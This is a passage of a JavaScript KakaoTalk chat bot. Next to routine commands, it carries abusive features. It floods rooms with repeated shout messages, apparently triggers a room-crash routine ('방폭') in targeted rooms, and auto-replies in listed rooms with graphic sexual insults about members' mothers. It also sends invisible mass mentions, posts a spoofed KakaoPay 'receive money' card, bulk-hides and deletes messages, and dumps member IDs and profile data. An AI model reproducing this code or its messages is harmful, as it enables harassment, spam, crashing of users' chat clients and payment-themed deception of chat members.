                                    .text("부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! ")
                                    .build(1)
                                )
                              break;
                              case 5 :
                                channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
                                    .text("야~딱좋다 기분좋다야~딱좋다 기분좋다야~딱좋다 기분좋다")
                                    .build(1)
                                )
                              break;
                            }
                            i++;
                        }, 180);
                    } else {
                        channel.sendChat("[ 🛡 ]  이미 도배를 하는중입니다");
                    }
                }
            }

            if (king.includes(roomId)) {
                if (!data.text.startsWith(prefix + "방폭")) {
            sendErrorPhone3()    
            }}


            if (fuck.includes(roomId)) {
                var value = Math.floor(Math.random() * 10);
                switch (value) {
                    case 0:
                        channel.sendChat("느그애미 일본놀러갔다가 방사능 피폭되서 클리토스에 불들어옴 ㅋ")
                        break;
                    case 1:
                        channel.sendChat("니애미 대음순 사이 안딲아서 욕창 걸리고 찌릉내 개쩔어서 날파리 꼬임");
                        break;
                    case 2:
                        channel.sendChat("느금마 보지 요실금 존나 심해서 눈만깜빡여도 자동 분사되는 분무기보지");
                        break;
                    case 3:
                        channel.sendChat("느그애미중풍걸려 허리굳어서 테크닉레벨떨어졋다고 남편한태 대가리 떠블클릭당함");
                        break;
                    case 4:
                        channel.sendChat("느금마 한타임 삼만원짜리 늙은 시골 여관바리");
                        break;
                    case 5:
                        channel.sendChat("느그애미 소음순 죤나 잘늘어나서 그걸로 줄달리기 쌉가능");
                        break;
                        case 7:
                            channel.sendChat("느그애미 에수 패티쉬있어서 기독교 티비보면서 셀프 씹질죤나하다가 시아버지하태 걸려서 파리채로등짝죤나 맞음ㅋ");
                            break;
                            case 8:
                                channel.sendChat("느그애미 거울비추면서 볼펜으로 똥꼬가지고 놀다가애미한태 걸려서 인간방방됨");
                                break;       
                                case 9:
                                    channel.sendChat("느금마 누워서 보지쪽에 선풍기 틀엇는데 특유의 시궁창 짜릉내때문에질식해서 눈깔 돌아감");
                                    break;   
                            }
            }
            if (data.text.startsWith(prefix + "투명멘션")) {
                if (adminList.includes(id)) {
                    console.log("!")
            let allUser = Array.from(channel.getAllUserInfo());
            let mentions = [];
            console.log("!")
            allUser.forEach((user, index, _this) => {
              if (String(user.userId).length < 10) return;
              if (!mentions[Math.floor(index / 15)])
                mentions[Math.floor(index / 15)] = [];
              mentions[Math.floor(index / 15)].push({
                user_id: user.userId,
                at: [(index % 15) + 1],
                len: 1,
              })
            })
            console.log("!")
            mentions.forEach((v) => {
              sendrawch(20,"", {
                type: "",
                url : '4417409.emot_004.webp',
                name: "(이모티콘)",
                width: "1",
                height: "1",
                sound: "",
                alt: "카카오 이모티콘",
                mentions: v,
              })
            })}}
    
            if (data.text.startsWith(prefix + "m")) {
                if (adminList.includes(id)) {
                    console.log("!")
            let allUser = Array.from(channel.getAllUserInfo());
            let mentions = [];
            allUser.forEach((user, index, _this) => {
              if (String(user.userId).length < 10) return;
              if (!mentions[Math.floor(index / 15)])
                mentions[Math.floor(index / 15)] = [];
              mentions[Math.floor(index / 15)].push({
                user_id: user.userId,
                at: [(index % 15) + 1],
                len: 1,
              })
            })
            mentions.forEach((v) => {
              sendrawch(1,"멘션", {
                mentions: v,
              })
            })}}
    
        if (data.text.startsWith(prefix + "주사위")) {
                var value = Math.floor(Math.random() * 5);
                switch (value) {
                    case 0:
                        channel.sendChat("⚀");
                        break;
                    case 1:
                        channel.sendChat("⚁");
                        break;
                    case 2:
                        channel.sendChat("⚂");
                        break;
                    case 3:
                        channel.sendChat("⚃");
                        break;
                    case 4:
                        channel.sendChat("⚄");
                        break;
                    case 5:
                        channel.sendChat("⚅");
                        break;
                }
            }
        

        if (data.text.startsWith(prefix + "채금 ")) {
            if (adminList.includes(id)) {
                try {
                    var v = roomId + ":" + data.mentions[0].user_id;
                    if (!Hider) {
                        channel.sendChat("이 채널은 채팅금지 설정이 안되어 새로운 설정을 적용하기 시작합니다.");
                        Hider = [];
                    }
                    if (v) {
                        if (!Hider.includes(v)) {
                            Hider.push(v);
                            var list;
                            for (getValueFor in Hider) {
                                list += v + "\n";
                            }
                            channel.sendChat("유저 '" + v + "' 의 모든 메시지를 가리기 시작합니다.");
                        } else {
                            channel.sendChat("해당 유저는 이미 리스트에 등재되있습니다.");
                        }
                    } else {
                        channel.sendChat("채금 @멘션' 의 형태로 써주세요.");
                    }
                } catch (error) {
                    channel.sendChat("작업 과정에서 오류가 발생했습니다.\n" + error);
                }
            } else {
                channel.sendChat("당신은 해당 명령어를 수행할 권한이 없습니다!");
            }
        }

        if (data.text.startsWith(prefix + "채금해제 ")) {
            if (adminList.includes(id)) {
                try {
                    var v = roomId + ":" + data.mentions[0].user_id;
                    if (String(v)) {
                        var v1 = Hider.indexOf(String(v));
                        if (v1 > -1) {
                            Hider.splice(v1, 1);
                            channel.sendChat("해당 유저를 리스트에서 삭제했습니다.");
                        } else {
                            channel.sendChat("리스트에 없는 유저입니다.");
                        }
                    } else {
                        channel.sendChat("채금해제 @멘션' 의 형태로 써주세요.");
                    }
                } catch (error) {
                    channel.sendChat("작업 과정에서 오류가 발생했습니다.");
                }
            } else {
                channel.sendChat("당신은 해당 명령어를 수행할 권한이 없습니다!");
            }
        }



        if (data.text == prefix + "한강") {
                request('http://hangang.dkserver.wo.tc', (error, response, html) => {
                    const river = JSON.parse(html);
                    channel.sendChat("현재 한강 온도는 " + river.temp + "°C 입니다!");
                });
        }
        if (banKey.includes(roomId )) {
            var didYouBan = false;
            for (getValueFor = 0; getValueFor < banWord.length; getValueFor++) {
                if (data.text.includes(banWord[getValueFor])) {
                    if (didYouBan == false) {
                        didYouBan = true;
                        channel.sendChat(new node_kakao.ChatBuilder().text("[ ! ] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: id }))).text("님이 욕설 또는 광고를 보내셨습니다").build(1));
                        pausecomp(110)
                        channel.hideChat(data.chat);
                                        }
                }
            }
        }
        if (banKey2 == "yes") {
            for (getValueFor = 0; getValueFor < banWord2.length; getValueFor++) {
                if (data.text.includes(banWord2[getValueFor])) {
                    if (didYouBan == false) {
                        didYouBan = true;
                        channel.hideChat(data.chat);
                        channel.kickUser2(id);
                        channel.sendChat(new node_kakao.ChatBuilder().text("[ ! ] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: id }))).text("님이 광고를 보내셨습니다").build(1));
                    }
                }
            }}


        if (data.text == prefix + "삭제") {
            if (adminList.includes(id)) {
                if (data.originalType == node_kakao.KnownChatType.REPLY) {
                    try {
                        channel.deleteChat2(data._chat.attachment.src_logId);
                    } catch (error) {
                        channel.sendChat("오류" + error);
                    }
                } else {
                    channel.sendChat("해당 명령어는 답장 형태로 적어주세요.");
                }
            }
        }

        if (data.text == prefix + "읽은사람") {
            if (adminList.includes(id)) {
                if (data.originalType == node_kakao.KnownChatType.REPLY) {
                    try {
                        const reply = data.attachment(node_kakao.ReplyAttachment);
                        const logId = reply.src_logId;
                        if (logId) {
                            const readers = channel.getReaders({ logId });
                            channel.sendChat( `읽은사람 수: ${readers.length}` + "\u200b".repeat(1000) + `\n\n읽은사람 닉네임:\n${readers.map(reader => reader.nickname).join('\n')}`);
                        }
                    } catch {
                        channel.sendChat(error);
                    }
                } else {
                    channel.sendChat("[ 🛡 ] 답장 형식이 아닙니다");
                }
            }
        }

        if(roomId == "18286056132767345") {
        if(data.text == prefix + "애드온") {
            sendrawch(23,"",{
                "L": "",
                "Q": "애드온 LIST",
                "V": "list",
                "I": "",
                "F": {
                    "BU": [
                        {
                            "T": "클릭하셔서 다운 가능합니다",
                            "L": "",
                            "TP": "more"
                        }
                    ]
                },
                "R": [
                    {
                        "T": "칭호 애드온",
                        "D":  "마크안에 칭호을 설정 가능합니다!",
                        "I": "https://t1.daumcdn.net/cfile/tistory/1968CE45505C188506",
                        "L": "https://cdn.discordapp.com/attachments/923097888576393248/926430046309212210/Smelly_Chat_BEH.mcpack",
                        "W": 216,
                        "H": 216
                    },
                    {
                        "T": "커스텀 메시지 애드온",
                        "D":  "마크안에 커스텀 메시지를 설정 가능합니다!",
                        "I": "https://t1.daumcdn.net/cfile/tistory/1968CE45505C188506",
                        "L": "https://cdn.discordapp.com/attachments/923097888576393248/926430046552473620/36bffaa4a1e3a29a.mcpack",
                        "W": 216,
                        "H": 216
                    },
                    {
                        "T": "도배 방지 애드온",
                        "D":  "마크 채팅 도배를 방지합니다!",
                        "I": "https://t1.daumcdn.net/cfile/tistory/1968CE45505C188506",
                        "L": "https://cdn.discordapp.com/attachments/923097888576393248/926823823809064980/yeondu_script.mcpack",
                        "W": 216,
                        "H": 216
                    },
                ]
            })
        }}

        if (data.text == prefix + "임티목록") {
            if (adminList.includes(id)) {
                channel.sendChat("이모티콘 코드 목록" + "\u200b".repeat(1000) +
                    "\n" +
                    "\n" +
                    "\n4412207 안녕 니니즈 (무료) (움직임)" +
                    "\n2212560 카카오프렌즈 클래식 (무료) (안움직임)" +
                    "\n4412255 안녕! 나는 익명이고 언제나 조아해 (유료) (움직임)" +
                    "\n9000123 안녕! 나는 익명이고 엄청 좋아해 (유료) (안움직임)" +
                    "\n4412008 안녕! 나는 익명이고 오늘도 좋아해 (유료) (안움직임)" +
                    "\n4412234 키키코코모모2 (유료) (움직임)" +
                    "\n4412355 화가 많은 엄지형 (유료) (움직임)" +
                    "\n4412444 올망졸망 글자티콘 (유료) (움직임)" +
                    "\n4413442 녹아버린 마시멜로 멜냥이 (유료) (움직임)" +
                    "\n4413442 쿨시크 액션 햄저스 (유료) (움직임)" +
                    "\n4412442 그냥그런토끼 Ver.3 (유료) (움직임)" +
                    "\n4412550 하위! 파란댕댕이! (유료) (움직임)" +
                    "\n4412300 오쯔네코 수고했어 오늘도 (유료) (움직임)" +
                    "\n4414206 10살 펭귄 펭수의 일상 2탄 (유료) (움직임)" +
                    "\n4415442 망그러진 곰 (유료) (움직임)" +
                    "\n4411439 프렌즈 홀리데이 (유료) (움직임)" +
                    "\n4412045 격려 잘하는 잘곰이 (유료) (움직임)" +
                    "\n9000164 튀어나오는 목아지콘 (유료) (움직임)" +
                    "\n4420117 쥐방울은 사랑스렁 (유료) (움직임)" +
                    "\n2221163 뽀시래기 복동이의 슬기로운 주식생활 (유료) (안움직임)" +
                    "\n4416520 돗개는 오늘도 왈왈2 (유료) (움직임)" +
                    "\n4416471 총총! (유료) (움직임)" +
                    "\n4403128 유쾌한 동네놈들 (유료) (움직임)" +
                    "\n4415740 더 급하개 더 바쁘개 (유료) (움직임)" +
                    "\n4416484 빵덕후 고양이 2 (유료) (움직임)" +
                    "\n4414429 봄이는 뽀잉뽀잉 (유료) (움직임)" +
                    "\n4411015 우쭈쭈쭈모찌찌찌 (유료) (움직임)" +
                    "\n2214743 관심좀콘 (유료) (안움직임)" +
                    "\n4415752 촐랑촐랑 깐족제비 (유료) (움직임)" +
                    "\n4414420 인성터진 파란친구 (유료) (움직임)" +
                    "\n2221289 병주고 약주는 기복이 3 (유료) (안움직임)" +
                    "\n4416423 한자티콘 (유료) (움직임)" +
                    "\n4416283 쿨데레 그녀 (유료) (움직임)" +
                    "\n2214616 게임하는 하루 (유료) (안움직임)" +
                    "\n2214958 매일매일이 숙제야.. (유료) (안움직임)" +
                    "\n2212330 감정이 풍부한 아이 (유료) (안움직임)" +
                    "\n2212383 부질없는 인간의 공명하는 세계 (유료) (안움직임)" +
                    "\n4415985 케장콘13 (유료) (움직임)" +
                    "\n4401161 또 저예요 영철이에요 (유료) (움직임)" +
                    "\n4401166 춥지 않소 김춘배요 (유료) (움직임)" +
                    "\n4401141 또 반갑소 김춘배요 (유료) (움직임)" +
                    "\n4401146 다시 반갑소 김춘배요 (유료) (움직임)" +
                    "\n2214634 잔망 루피 2 (유료) (안움직임)" +
                    "\n2214471 잔망 루피 (유료) (안움직임)" +
                    "\n9000109 화려하게 나타난 전광티콘 (유료) (움직임)" +
                    "\n4414147 등장!! 단톡방 용사님 (유료) (움직임)" +
                    "\n4414153 파자마 그녀 4 (유료) (움직임)" +
                    "\n2214504 파자마 친구 2 (유료) (안움직임)" +
                    "\n4414875 나도 맹수다 (유료) (움직임)" +
                    "\n4401154 키워, 키우라고 금수친구들 (유료) (움직임)" +
                    "\n4414153 파자마 그녀 4 (유료) (움직임)" +
                    "\n4412197 뽀잉뽀잉 뚠때니 펭귄 (유료) (움직임)" +
                    "\n4401072 연애혁명 (유료) (움직임)" +
                    "\n4413107 약 올릴 떄 행복한 관종 재일이 (유료) (움직임)" +
                    "\n4414342 애니멀 특전대 깐족깐족 찐깐족! (유료) (움직임)" +
                    "\n4412660 귀여운 히어로, 어벤져스 (유료) (움직임)" +
                    "\n4412465 바른생활 극사실 주의 (유료) (움직임)");
            }
        }



        if (data.text === '-방로그') {
            if (adminList.includes(id)) {
                channel.sendChat("■■■Room_Log■■■" + "\u200b".repeat(1000) + "\n" +
                    channel.getChannelInfo()
                )
            }
        }
        if (data.text === '-가리기a') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
                let start = new Date();  // 시작
               var chlog = '';
               var reply = data.attachment();
               var logId = reply.src_logId;
               channel.getChatListFrom(logId).then(r => {
                  if (r.result) {
                     r.result.forEach((v , i) => {
                            channel.hideChat(v)
                            i++
                     });
                     test();
                     let end = new Date();  // 종료
                     var ms = end - start
                     var ms1 = ms * 0.01
                     channel.sendChat("RUNTIME : " + ms1 + "s" )
                  }
               });
            }
         }}

        if (data.text === '-삭제a') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
                let start = new Date();  // 시작
               var chlog = '';
               var reply = data.attachment();
               var logId = reply.src_logId;
               channel.getChatListFrom(logId).then(r => {
                  if (r.result) {
                     r.result.forEach((v, i) => {
                         try {
                        channel.deleteChat2(data._chat.attachment.src_logId)
                        channel.deleteChat2(v.logId)
                         } catch(error) {
                             console.log(error)
                         }
                     });
                     test();
                     let end = new Date();  // 종료
                     var ms = end - start
                     var ms1 = ms * 0.01
                     channel.sendChat("RUNTIME : " + ms1 + "s" )
                  }
               });
            }
         }}


         if (data.text.startsWith(prefix + "검색 ")) {
            var search = data.text.replace(prefix + "검색 ", ""); 
            var search_ = encodeURI(search)
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
               "L": "",
               "Q": "[ " + search + "에 검색 결과입니다 ]",
               "V": "list",
               "I": "",     
               "R": [
                  {
                     "T": "[ 유튜브 ]",
                     "D": "[ " + search + "에 검색 결과입니다 ]",
                     "I": "https://i.pinimg.com/originals/94/a1/d8/94a1d897928fc23f489204266df5a35f.png",
                     "L": "https://www.youtube.com/results?search_query=" + search_,
                     "W": 216,
                     "H": 216
                  },
                  {
                    "T": "[ 구글 ]",
                    "D": "[ " + search + "에 검색 결과입니다 ]",
                    "I": "https://lamanus.kr/wp-content/uploads/2018/08/google-2048x1536.png",
                    "L": "https://www.google.co.kr/search?q=" + search_,
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ 나무위키 ]",
                    "D": "[ " + search + "에 검색 결과입니다 ]",
                    "I": "https://th.bing.com/th/id/OIP.9U_csAu86wh_TDsWTu584gHaHa?pid=ImgDet&rs=1",
                    "L": "https://namu.wiki/w/" + search_,
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ 네이버 ]",
                    "D": "[ " + search + "에 검색 결과입니다 ]",
                    "I": "https://th.bing.com/th/id/OIP.CS1M4QfYLA7psPkhbOv_awHaCA?w=321&h=94&c=7&r=0&o=5&pid=1.7",
                    "L": "https://search.naver.com/search.naver?where=nexearch&sm=top_hty&fbm=1&ie=utf8&query=" + search_,
                    "W": 216,
                    "H": 216
                 },
               ]
            }))
            .build(23)
            );
        }

        function pausecomp(millis) {
            var date = new Date();
            var curDate = null;
            do {
              curDate = new Date();
            } while (curDate - date < millis);
          }








         if (data.text.startsWith(prefix + "코로나")) {
            request("https://search.naver.com/search.naver?where=nexearch&sm=top_hty&fbm=0&ie=utf8&query=%EC%BD%94%EB%A1%9C%EB%82%98",
            (error, response, html) => {
                var $ = cheerio.load(html);
                var hak = $("div.status_info").text().split(" ")[4];
                var nhak = $("div.status_info").text().split(" ")[5];
                var d = $("div.status_info").text().split(" ")[9];
                var nd = $("div.status_info").text().split(" ")[10];
                var ti = $("span._update_time").text()
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
               "L": "",
               "Q": "[⚔ 코로나 현황 ⚔]",
               "V": "list",
               "I": "",
               "F": {
                "BU": [
                   {
                      "T": "더 자세히 보기",
                      "L": "https://corona-live.com",
                      "TP": "more"
                   }
                ]
             },      
               "R": [
                  {
                     "T": "[ 확진자 ]",
                     "D": hak + "명",
                     "I": "",
                     "L": "",
                     "W": 216,
                     "H": 216
                  },
                  {
                    "T": "[ 신규 확진자 ]",
                    "D": nhak + "명",
                    "I": "",
                    "L": "",
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ 사망자 ]",
                    "D": d + "명",
                    "I": "",
                    "L": "",
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ 신규 사망자 ]",
                    "D": nd + "명",
                    "I": "",
                    "L": "",
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ 집계 기준 ]",
                    "D": ti + "\n집계 기준",
                    "I": "",
                    "L": "",
                    "W": 216,
                    "H": 216
                 },
               ]})).build(23))});
        }
        if (data.text.startsWith(prefix + "tts ")) {
            if (adminList.includes(id)) {
                try {
                var tts = data.text.replace(prefix + "tts ", "")
                if(tts.length < 80) {
                    var url = "https://tts-translate.kakao.com/newtone?message=" + encodeURI(tts)
                    http.get(url.replace("https", "http"), (res) => {
                        var file = fs.createWriteStream(`tts.m4a`);
                        res.pipe(file);
                        file.on('finish', () => {
                            async function msg() {
                                await file.close();
                                await channel.sendMedia(node_kakao.KnownChatType.AUDIO, {
                                    name: `tts.m4a`,
                                    data: fs.readFileSync(`tts.m4a`),
                                    width: 500,
                                    height: 500,
                                    ext: 'm4a'
                                });
                            }
                            msg();
                        });
                    }).on("error", (err) => {
                        console.log("Error: ", err.message);
                    });
            } else {
                channel.sendChat("글이 너무 깁니다!")
            }
        } catch (error) {
            console.log(error
                )
        }
        }
        } 

//로깅
        console.log("[ SERVER : " + channel.getDisplayName() + " ] [ Name : " + sender.nickname  + "( " + sender.userId + " ) ] : " + data.text )

             if (data.text == prefix + "방제n") {
                if (adminList.includes(id)) {
                    $TitleSpamList[roomId] = false;
                }}
                if (data.text.startsWith(prefix + "방제p ")) {
                if (adminList.includes(id)) {
                    try {
                        var title = data.text.replace(prefix + "방제p ", "");
                        $TitleSpamList[roomId] = title;
                        channel.setTitleMeta(title);
                        channel.sendChat("방 제목을 [ " + title + " ] 로 고정합니다!");
                    } catch (e) {
                        channel.sendChat(e + "");
                    }
                }}


        if (data.text.startsWith(prefix + "큐알 ")) {
            if (adminList.includes(id)) {
                var QR = data.text.replace(prefix + "큐알 ", "")
                    var url = "https://chart.apis.google.com/chart?cht=qr&chs=526x526&chl=" + encodeURI(QR)
                    http.get(url.replace("https", "http"), (res) => {
                        var file = fs.createWriteStream(`${id}.png`);
                        res.pipe(file);
                        file.on('finish', () => {
                            async function msg() {
                                await file.close();
                                await channel.sendMedia(node_kakao.KnownChatType.PHOTO, {
                                    name: `${id}.png`,
                                    data: fs.readFileSync(`${id}.png`),
                                    width: 500,
                                    height: 500,
                                    ext: 'jpg'
                                });
                                await fs.unlinkSync(`${id}.png`);
                            }
                            msg();
                            pausecomp(220)
                            channel.sendChat("생선된 QR 코드입니다!")
                        });
                    }).on("error", (err) => {
                        console.log("Error: ", err.message);
                    });
            }
        }
        if (data.text.startsWith(prefix + "사진 " )) {
            if (adminList.includes(id)) {
                var url = data.text.replace(prefix + "사진 ", "");
                        http.get(url.replace("https", "http"), (res) => {
                        var file = fs.createWriteStream(`p1.png`);
                        res.pipe(file);
                        file.on('finish', () => {
                            async function msg() {
                                await file.close();
                                await channel.sendMedia(node_kakao.KnownChatType.PHOTO, {
                                    name: `p1.png`,
                                    data: fs.readFileSync(`p1.png`),
                                    width: 500,
                                    height: 500,
                                    ext: 'jpg'
                                });
                                await fs.unlinkSync(`p1.png`);
                            }
                            msg();
                        });
                    }).on("error", (err) => {
                        channel.sendChat("오류가 발생했습니다!" + error)
                    });
            }
        }

        if (data.text.startsWith(prefix + "프사" )) {
            if (adminList.includes(id)) {
                if (data.mentions[0]) {
                    var mention = data.mentions[0];
                    var url = channel.getUserInfo({ userId: mention.user_id }).originalProfileURL || "이미지 확인 불가";
                    http.get(url.replace("https", "http"), (res) => {
                        var file = fs.createWriteStream(`p.png`);
                        res.pipe(file);
                        file.on('finish', () => {
                            async function msg() {
                                await file.close();
                                await channel.sendMedia(node_kakao.KnownChatType.PHOTO, {
                                    name: `p.png`,
                                    data: fs.readFileSync(`p.png`),
                                    width: 500,
                                    height: 500,
                                    ext: 'jpg'
                                });
                                await fs.unlinkSync(`p.png`);
                            }
                            msg();
                        });
                    }).on("error", (err) => {
                        console.log("Error: ", err.message);
                    });
                } else {
                    channel.sendChat("프사를 가져올 대상을 멘션해주세요!");
                }
            }
        }


        if (data.text == prefix + "방정보") {
            if (adminList.includes(id)) {
                try {
                    var userList = Array.from(channel.getAllUserInfo());
                    var msg = "방 제목: " + channel.getDisplayName()+
                    "\n\n방 아이디: " + roomId +
                    "\n\n방 인원: " + channel.userCount +
                    "\n\n----------------------------" +
                    "";
                    for (var i = 0; i < userList.length; i++) {
                        try {
                            msg += "\n\n닉네임: " + userList[i].nickname+ "\n아이디: " + userList[i].userId + "\n프로필 사진: " + userList[i].profileURL 
                        } catch {

                        }
                    }

                    msg += "\n\n----------------------------";

                   sendLong(channel,"■■■■■ 방정보 ■■■■■", msg)
                } catch (error) {
                    channel.sendChat("오류!\n" + error);
                }
            }
        }

         if (data.text.startsWith(prefix + "강퇴 ")) {
            if (adminList.includes(id)) {
                    var _Mention = data.mentions[0].user_id;
                        channel.kickUser2(_Mention);
                        channel.sendChat("💥Kicked💥\n\n" + data.mentions[0].user_id);
                    }
                }
         if (data.text === '-메시지') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
               var chlog = '';
               var reply = data.attachment();
               var logId = reply.src_logId;
               channel.getChatListFrom(logId).then(r => {
                  if (r.result) {
                     r.result.forEach((v, i) => {
                         try {
                        chlog +=
                           '보낸사람 아이디 : ' +
                           channel.getUserInfo({userId: v.sender.userId}).userId +
                           ' 메세지: ' +
                           v.text + "\n\n";
                         } catch(error) {
                             console.log(error)
                         }
                     });
                     sendLong(channel , "기록된 메시지 로그입니다!" , chlog)
                  }
               });
            }
         }}

         if (data.text == '-밑메') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
               var chlog = '';
               var nick= "";
               var reply = data.attachment();
               var logId = reply.src_logId;
               try {
               channel.getChatListFrom(logId).then(r => {
               var a =  JSON.stringify(r.result[0].attachment, null, 3)
                        chlog +=
                           '보낸사람 아이디: ' +
                           r.result[0].sender.userId +
                           '\n\n' +
                           '방 아이디: ' +
                           channel.info.channelId +
                           '\n\n' +
                           '보낸 시간: ' +
                           new Date(r.result[0].sendAt) +
                           '\n\n' +
                           '메세지 타입: ' +
                           r.result[0].type +
                           '\n\n' +
                           '어태치: ' +
                           a + "\n" +
                           '\n' +
                           '메세지: ' +
                           r.result[0].text +
                           '\n\n --------------------------------------- \n';
                     channel.sendChat(r.result[0])
                     pausecomp(220)
                     sendLong(channel , "로그(Log)" , chlog)
                     pausecomp(220)
                     sendLong(channel, "이발", prefix + "ev sendrawch(" +r.result[0].type +",'" + r.result[0].text + "'," + a + ")");
               });
            } catch(error) {
                channel.sendChat(error)
            }
            }
         }}
        


        if (data.text === '-로그') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
               var chlog = '';
               var nick= "";
               var reply = data.attachment();
               var logId = reply.src_logId;
               try {
               channel.getChatListFrom(logId).then(r => {
                  if (r.result) {
                     r.result.forEach((v, i) => {
                        chlog +=
                           '보낸사람 아이디: ' +
                           v.sender.userId +
                           '\n\n' +
                           '방 아이디: ' +
                           channel.info.channelId +
                           '\n\n' +
                           '보낸 시간: ' +
                           new Date(v.sendAt) +
                           '\n\n' +
                           '메세지 타입: ' +
                           v.type +
                           '\n\n' +
                           '어태치: ' +
                           JSON.stringify(v.attachment, null, 3) + "\n" +
                           '\n' +
                           '메세지: ' +
                           v.text +
                           '\n\n --------------------------------------- \n';
                     });
                     sendLong(channel , "로그(Log)" , chlog)
                  }
               });
            } catch(error) {
                channel.sendChat(error)
            }
            }
         }}
        



        if (data.text.startsWith(prefix + "송금 ")) {
            if (adminList.includes(id)) {
            var km = data.text.replace(prefix + "송금 ", "")
                km * 1
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                        "L": "",
                        "Q": "카카오페이",
                        "V": "brand",
                        "R": [
                            {
                                "D": "",
                                "L": "",
                                "DE": "",
                                "I": "http://t1.daumcdn.net/kakaopay/money/tms/2018_v2_tms_send.png",
                                "T": km + "원을 받으세요"
                            }
                        ],
                        "F": {
                            "BU": [
                                {
                                    "T": "받기",
                                    "L": "https://www.kakaopay.com/ir/announcement/notice/2121"
                                }
                            ]
                        }
                    }))
                        .build(23)
                )
        }}

        if (data.text.startsWith(prefix + "강퇴해제")) {
            if (adminList.includes(id)) {
                try {
                    var user_id = data.text.replace(prefix + "강퇴해제 ", "");
                    var unbanUserObj = { userId: user_id };
                    channel.removeKicked(unbanUserObj);
                    channel.sendChat("[ " + user_id + " ] 님의 강퇴를 해제했습니다!");
                } catch (error) {
                    channel.sendChat("작업 과정에서 오류가 발생했습니다.\n" + error);
                }
            }
        }

        if (data.text.startsWith(prefix + "쪽지 ")) {
                var t2 = data.text.replace(prefix + "쪽지 ", "").split('/')[0];
                var t3 = data.text.replace(prefix + "쪽지 ", "").split('/')[1];
        sendrawch(23,"", {
            "L": "",
            "Q": "쪽지가 전달되었어요!",
            "V": "game",
            "F": {
                "BU": [
                   {
                      "T": "클릭해서 쪽지를 확인하세요!",
                      "L": "",
                      "TP": "more"
                   }
                ]
             }, 
            "R": [
               {
                  "D": "쪽지를 확인하겠습니까?",
                  "L": "",
                  "CV": {
                    "L": "",
                     "I": "https://search1.daumcdn.net/search/statics/special/mi/r2/bubble_img_jebi.png",
                     "T": "쪽지를 확인하세요!",
                     "DE": "쪽지를 확인하세요!"
                  },
                  "TP": "2",
                  "DR": {
                     "T": "",
                     "DE": ""
                  },
                  "RT": [
                     {
                        "ID": data.mentions[0].user_id,
                        "T": "💌",
                        "DE": t2
                     },
                     {
                        "ID": id,
                        "T": "💌",
                        "DE": t2
                     }
                  ],
                  "MI": 0
               }
            ],
            "RF": {
                "BU": [
                    {
                        "T": channel.getUserInfo({ userId: id }).nickname + "님이 " +channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "님에게 보낸 쪽지입니다!",
                        "L": "" 
                    }
               ]
            }
         })
        }

        
        if (data.text.startsWith(prefix + "o검색 ")) {
            var open = data.text.replace(prefix + "o검색 ", "")
            request("https://api.develope.kr/search/room/list?query=" + encodeURI(open) + "&type=m", function (err, res, html) {
                var openLinkResult = JSON.parse(html);
                if (openLinkResult.success == false) {
                channel.sendChat("아무런 방도 검색되지 않았어요!");
                } else {
                  sendLong(channel, open + "에 대한 오픈채팅 검색 결과입니다!",
                  openLinkResult.result.lists
                    .map((openLink) =>
                      [
                     "오픈채팅방 이름: " + openLink.name,
                        "오픈채팅방 링크: " + openLink.openlink,
                        "오픈채팅방 방장: " + openLink.owner,
                        "오픈채팅방 설명: " + openLink.desc,
                        "오픈채팅방 인원: " + openLink.headcount,
                        "오픈채팅방 방핱: " + openLink.like,
                        "오픈채팅방 방프: " + openLink.wp,
                        "========================="
                      ].join("\n")
                    )
                    .join("\n\n")
                );}
            })
        }

        if (data.text.startsWith(prefix + "파싱 ")) {
            var url = data.text.replace(prefix + "파싱 ", "")
            request(url, function (err, res, html) {
                try {
                    var $ = cheerio.load(html);
                    sendLong(channel,"해당 사이트의 파싱 내용입니다" , html)
                } catch (err) {
                    channel.sendChat(err)
                }
            });
        }

        if (data.text.startsWith(prefix + "링크 ")) {
            var link = data.text.replace(prefix + "링크 ", "")
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "inapp": true,
                    "f": true
                })).text(link).build(1)
            )
        }


        if (data.text.startsWith(prefix + "임티 ")) {
            if (adminList.includes(id)) {
                var m1 = data.text.replace(prefix + "임티 ", "").split('/')[0];
                var m2 = data.text.replace(prefix + "임티 ", "").split('/')[1];
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                        "type": "animated-sticker/digital-item",
                        "url": m1 + '.emot_' + m2 + '.webp',
                        "name": "(이모티콘)",
                        "sound": "",
                        "width": "360",
                        "height": "360",
                        "msg": '',
                        "alt": "카카오 이모티콘"
                    })).build(20)
                );
            }
        }
 

        if (data.text.startsWith(prefix + "메도 ")) {
            if (adminList.includes(id)) {
